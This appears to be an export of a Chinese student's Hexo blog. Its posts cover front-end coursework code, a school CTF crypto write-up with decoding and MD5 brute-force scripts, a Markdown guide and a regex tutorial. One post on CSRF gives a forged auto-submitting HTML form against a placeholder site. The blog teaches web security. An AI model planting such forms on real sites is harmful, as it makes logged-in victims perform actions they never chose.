<span class="keyword">if</span>(checkemail()==<span class="literal">false</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		alert(<span class="string">"请按照格式输入账号密码!"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">onkeyup=<span class="string">"this.value=this.value.replace(/[^\w]/g,'')"</span> onpaste=<span class="string">"this.value=this.value.replace(/[^\w]/g,'')"</span></span><br></pre></td></tr></table></figure>

<p>3.2:主页二级菜单</p>
<blockquote>
<p>利用jquery(位于/js/jquert-3.3.1.min.js),编写函数来调用jquery中的方法，利用show()跟hide()来显示跟隐藏二级菜单。  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   $(<span class="string">".firstMenu"</span>).hover(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         $(<span class="keyword">this</span>).next().show();</span><br><span class="line">   &#125;,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         $(<span class="keyword">this</span>).next().hide();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">".secondMenu"</span>).hover(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          $(<span class="keyword">this</span>).show();</span><br><span class="line">    &#125;,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          $(<span class="keyword">this</span>).hide();</span><br><span class="line">     &#125;);   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>3.3:json请求</p>
<blockquote>
<p>简单的请求Github上存放的数据,显示到页面中去。</p>
</blockquote>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var requestURL = 'https:<span class="comment">//raw.githubusercontent.com/feicaixu/cdujson/master/cdu.json';</span></span><br><span class="line">var request = <span class="keyword">new</span> <span class="constructor">XMLHttpRequest()</span>;</span><br><span class="line">request.<span class="keyword">open</span>('GET',requestURL);</span><br><span class="line">request.responseType = 'json';</span><br><span class="line">request.send<span class="literal">()</span>;</span><br><span class="line">request.onload = <span class="keyword">function</span><span class="literal">()</span>&#123;</span><br><span class="line">	 var JSONObject = request.response;</span><br><span class="line">	 document.get<span class="constructor">ElementById('<span class="params">map_name</span>')</span>.innerHTML=<span class="module-access"><span class="module"><span class="identifier">JSONObject</span>.</span></span>name;</span><br><span class="line">	 document.get<span class="constructor">ElementById('<span class="params">map_adress</span>')</span>.innerHTML=<span class="module-access"><span class="module"><span class="identifier">JSONObject</span>.</span></span>address;</span><br><span class="line">	 document.get<span class="constructor">ElementById('<span class="params">map_time</span>')</span>.innerHTML=<span class="module-access"><span class="module"><span class="identifier">JSONObject</span>.</span></span>time;</span><br><span class="line">	 document.get<span class="constructor">ElementById('<span class="params">map_area</span>')</span>.innerHTML=<span class="module-access"><span class="module"><span class="identifier">JSONObject</span>.</span></span>area;</span><br><span class="line">	 document.get<span class="constructor">ElementById('<span class="params">map_site</span>')</span>.innerHTML=<span class="module-access"><span class="module"><span class="identifier">JSONObject</span>.</span></span>site;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>3.4:自制的画廊</p>
<blockquote>
<p>通过控制图片的位置变化，来达到画廊的作用。</p>
</blockquote>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">//核心css代码</span></span><br><span class="line">.wrap ul li.<span class="keyword">on</span>&#123;</span><br><span class="line">	width: <span class="number">600</span>px;</span><br><span class="line">	height: <span class="number">400</span>px;</span><br><span class="line">	margin-top: <span class="number">0</span>;</span><br><span class="line">	opacity: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//js代码</span></span><br><span class="line"><span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'ul'</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> aLi = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">num</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//循环遍历图片</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">	aLi[i].index=i;</span><br><span class="line">	aLi[i].onclick=function() &#123;</span><br><span class="line">		<span class="built_in">num</span>=<span class="keyword">this</span>.index; </span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;j++) &#123;</span><br><span class="line">			aLi[j].className=<span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.className=<span class="string">'on'</span>;</span><br><span class="line">		<span class="comment">//点击时图片移动的距离</span></span><br><span class="line">		oUl.style.marginLeft=-(<span class="built_in">num</span>*<span class="number">100</span>+<span class="number">200</span>)+<span class="string">'px'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>3.5:利用bootstrap制作的画廊</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//引用bootstrap</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//画廊实现</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"index_main2"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"lunbo_position"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myCarousel"</span> <span class="attr">class</span>=<span class="string">"carousel slide"</span>&gt;</span></span><br><span class="line">			<span class="comment">&lt;!-- 轮播（Carousel）指标 --&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"carousel-indicators"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">li</span> <span class="attr">data-target</span>=<span class="string">"#myCarousel"</span> <span class="attr">data-slide-to</span>=<span class="string">"0"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">li</span> <span class="attr">data-target</span>=<span class="string">"#myCarousel"</span> <span class="attr">data-slide-to</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">li</span> <span class="attr">data-target</span>=<span class="string">"#myCarousel"</span> <span class="attr">data-slide-to</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>   </span><br><span class="line">			<span class="comment">&lt;!-- 轮播（Carousel）项目 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"carousel-inner"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item active"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/class_1.jpg"</span> <span class="attr">alt</span>=<span class="string">"First slide"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"carousel-caption"</span>&gt;</span>Struts-2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/class_2.jpg"</span> <span class="attr">alt</span>=<span class="string">"Second slide"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"carousel-caption"</span>&gt;</span>windows内核提权<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/class_3.jpg"</span> <span class="attr">alt</span>=<span class="string">"Third slide"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"carousel-caption"</span>&gt;</span>密码学<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 轮播（Carousel）导航 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"left carousel-control"</span> <span class="attr">href</span>=<span class="string">"#myCarousel"</span> <span class="attr">role</span>=<span class="string">"button"</span> <span class="attr">data-slide</span>=<span class="string">"prev"</span>&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-chevron-left"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Previous<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"right carousel-control"</span> <span class="attr">href</span>=<span class="string">"#myCarousel"</span> <span class="attr">role</span>=<span class="string">"button"</span> <span class="attr">data-slide</span>=<span class="string">"next"</span>&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-chevron-right"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Next<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h3><p>在这一学期的前端学习中，收获颇多。掌握了html，js，css的基础，很高兴的是学习了js，理解了DOM，在挖掘xss漏洞的时候给我提供了很大的帮助。</p>
]]></content>
      <tags>
        <tag>web FE</tag>
      </tags>
  </entry>
  <entry>
    <title>初探csrf以及如何利用</title>
    <url>/2019/01/16/%E5%88%9D%E6%8E%A2csrf%E4%BB%A5%E5%8F%8A%E7%AC%AC%E4%B8%80%E4%B8%AAcsrf%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>csrf学过有很长一段时间了，之前也就简单的知道这个是什么东西，大概是怎么实现，没有亲自挖掘到过，有幸的是在上周挖掘到两个，这里小小的记录一下</p>
<a id="more"></a>

<h3 id="1-csrf是什么？"><a href="#1-csrf是什么？" class="headerlink" title="1.csrf是什么？"></a>1.csrf是什么？</h3><p>在我个人的理解中，通过制造恶意链接，诱导在登陆某个web站点的时候请求了该恶意链接，而造成了以为用户并不想做的操作。例如添加/删除收获地址，改密码，修改个人信息等等。   </p>
<h3 id="2-怎么实现跟利用"><a href="#2-怎么实现跟利用" class="headerlink" title="2.怎么实现跟利用?"></a>2.怎么实现跟利用?</h3><p>举个例子：在某个网站我们进行添加收获地址的操作时，向服务器发送了以下请求</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get请求为：</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//aimsite.com?add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//post的数据为：</span></span><br><span class="line">name=xiaoming<span class="variable">&amp;phone</span>=<span class="number">13888888888</span><span class="variable">&amp;home</span>=chengdu</span><br></pre></td></tr></table></figure>

<p>在没有防御的情况下，可以构造以下表单：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-怎么实现点击链接就能提交？"><a href="#3-怎么实现点击链接就能提交？" class="headerlink" title="3.怎么实现点击链接就能提交？"></a>3.怎么实现点击链接就能提交？</h3><p>加入一段小小的js代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">autosubmit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>).submit();</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.load=autosubmit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>cdusec-ctf Crypto wp</title>
    <url>/2018/11/18/cdusec-ctf-Crypto-wp/</url>
    <content><![CDATA[<p>校赛Crypto的wp，这些题都比较简单吧，大多都能查得到，只是一些简单古典密码以及常见编码。</p>
<a id="more"></a>

<h3 id="1、签到"><a href="#1、签到" class="headerlink" title="1、签到"></a>1、签到</h3><p>复制输入即可，我给了一个链接，没有认真去看的23333 吃亏。</p>
<h3 id="2、凯撒"><a href="#2、凯撒" class="headerlink" title="2、凯撒"></a>2、凯撒</h3><p>简单的凯撒加密，key为4，在线工具丢进去即可。</p>
<h3 id="3、fuck！这是什么鬼"><a href="#3、fuck！这是什么鬼" class="headerlink" title="3、fuck！这是什么鬼"></a>3、fuck！这是什么鬼</h3><p>jsfuck,说到底也是js代码，一样能够像js一样执行，复制丢进浏览器的控制台就得flag。</p>
<h3 id="4、不一样的morse"><a href="#4、不一样的morse" class="headerlink" title="4、不一样的morse"></a>4、不一样的morse</h3><p>morse的中文编码xmorse，在线网站丢进去完事。</p>
<h3 id="5、你熟悉键盘吗？"><a href="#5、你熟悉键盘吗？" class="headerlink" title="5、你熟悉键盘吗？"></a>5、你熟悉键盘吗？</h3><p>一共5组字符串，一个字符串代表一个字母，在键盘上比划一下可以得到ANgLA。</p>
<h3 id="6、蕾蕾姐被表白了"><a href="#6、蕾蕾姐被表白了" class="headerlink" title="6、蕾蕾姐被表白了"></a>6、蕾蕾姐被表白了</h3><p>手机的9键拼音输入法加密，每2个数字对应一个字符，例如33，表示第三个键，第三个字符，即f，其他一样然后解出flag。</p>
<h3 id="7、奇怪的字符串"><a href="#7、奇怪的字符串" class="headerlink" title="7、奇怪的字符串"></a>7、奇怪的字符串</h3><p>Y对应1，N对应0，全部替换后二进制转字符串。</p>
<h3 id="8、the-other-base’s-member"><a href="#8、the-other-base’s-member" class="headerlink" title="8、the other base’s member"></a>8、the other base’s member</h3><p>base58，在线网站解码即可。</p>
<h3 id="9、easy-base-family"><a href="#9、easy-base-family" class="headerlink" title="9、easy_base_family"></a>9、easy_base_family</h3><p>base16，32，64混合编码，解码脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'base_family.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag=f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b16decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b32decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b64decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="10、蕾蕾姐的id"><a href="#10、蕾蕾姐的id" class="headerlink" title="10、蕾蕾姐的id"></a>10、蕾蕾姐的id</h3><p>md5爆破，会有多解的情况，只有一个正确。解密脚本：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import hashlib</span><br><span class="line">import sys</span><br><span class="line">keyword1=<span class="string">"41d"</span><span class="comment">#后三位</span></span><br><span class="line">keyword2=<span class="string">"fdc"</span><span class="comment">#2-5位</span></span><br><span class="line">key=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> key:</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> key:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> key:</span><br><span class="line">				word=str(a)+str(b)+str(c)+str(d)</span><br><span class="line">				flag=hashlib.md5(word)</span><br><span class="line">				<span class="keyword">if</span> flag.hexdigest()[-<span class="number">3</span>:]==keyword1 and flag.hexdigest()[<span class="number">2</span>:<span class="number">5</span>]==keyword2:</span><br><span class="line">					print flag.hexdigest()</span><br><span class="line">					sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="11、棋局"><a href="#11、棋局" class="headerlink" title="11、棋局"></a>11、棋局</h3><p>简单的棋盘加密，可以发现密文只有5个字母，urtql,附件的提示说flag的内容长度为10,想到棋盘加密。<br>解密脚本:   </p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"rquutrqqrtulrutuuurr"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in itertools.permutations(<span class="string">'tqlur'</span>, <span class="number">5</span>):</span><br><span class="line">    key.<span class="keyword">append</span>(<span class="string">''</span>.<span class="keyword">join</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key in key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c in cipher:</span><br><span class="line">        solve_c += str(now_key.<span class="built_in">index</span>(now_c))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = <span class="keyword">int</span>(solve_c[i])*<span class="number">5</span>+<span class="keyword">int</span>(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">res</span> += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> in re<span class="variable">s:</span></span><br><span class="line">        <span class="keyword">print</span> now_key,<span class="keyword">res</span></span><br></pre></td></tr></table></figure>

<p>觉得这个难？全都在这里：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">点击查看</a><br>关于棋盘加密的知识，以及本题的解密脚本都在里面。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>如何写一篇hexo博客</title>
    <url>/2018/09/04/%E5%A6%82%E4%BD%95%E5%86%99hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>本文介绍如何使用Hexo写出一篇‘比较’好看的文章，几句简单的语法，喜欢简介的话，可能就刚好适用。</p>
<a id="more"></a>

<hr>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote>
<p>这是一个引用,使用&gt;符号，置于文本前。(为方便阅读，下面的内容均使用了引用)</p>
</blockquote>
<hr>
<h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><blockquote>
<p>图片：！[](图片地址)</p>
</blockquote>
<blockquote>
<p>网址：[]()</p>
</blockquote>
<hr>
<h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><blockquote>
<p>粗体：用两个*包含一段文本就是粗体。    例：<strong>粗体</strong></p>
</blockquote>
<blockquote>
<p>斜体：用一个*包含一段文本就是斜体</p>
</blockquote>
<hr>
<h3 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h3><blockquote>
<p>使用两个`把中间的代码包含起来，例如：</p>
</blockquote>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">hello <span class="built_in">word</span>!</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><blockquote>
<p>分割线的语法只需要加三个-号或*(是不是发现一直再用分割线hhh<del>~</del>)</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>hexo学习</tag>
      </tags>
  </entry>
  <entry>
    <title>正则学习</title>
    <url>/2018/05/05/%E6%AD%A3%E5%88%99%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>学习爬虫的时候，想要从网页中找到特定的数据很麻烦，那么正则就很重要了。</p>
<a id="more"></a>

<h3 id="1-正则表达式"><a href="#1-正则表达式" class="headerlink" title="1.正则表达式"></a>1.正则表达式</h3><blockquote>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。在python中有re模块提供正则表达式。</p>
</blockquote>
<h3 id="2-正则表达式基础"><a href="#2-正则表达式基础" class="headerlink" title="2.正则表达式基础"></a>2.正则表达式基础</h3><p>2.1子模式</p>
<blockquote>
<p>\w&nbsp;&nbsp;:匹配任意字母，数字或者_<br>\d&nbsp;&nbsp;:匹配数字<br>\s&nbsp;&nbsp;:匹配空白字符<br>. &nbsp;&nbsp;&nbsp;:匹配任意字符</p>
</blockquote>
<p>2.2重复子模式</p>
<blockquote>
<p>\w+&nbsp;:表示匹配至少一个字母，数字或者_<br>\d*&nbsp;&nbsp;:表示匹配任意个数字，包括0<br>\w{3,8}:表示匹配3-8之间个字母，数字或_</p>
</blockquote>
<p>2.3 “或”运算: |</p>
<blockquote>
<p>(p|P)ython&nbsp;&nbsp;:可以匹配python，也可以匹配Python</p>
</blockquote>
<p>2.4 选择符：?</p>
<blockquote>
<p>(https://)?(www.)?(0xfire.com):<br>可以匹配 <a href="https://www.0xfire.com,也可以匹配www.0xfire.com,还可以匹配0xfire.com" target="_blank" rel="noopener">https://www.0xfire.com,也可以匹配www.0xfire.com,还可以匹配0xfire.com</a></p>
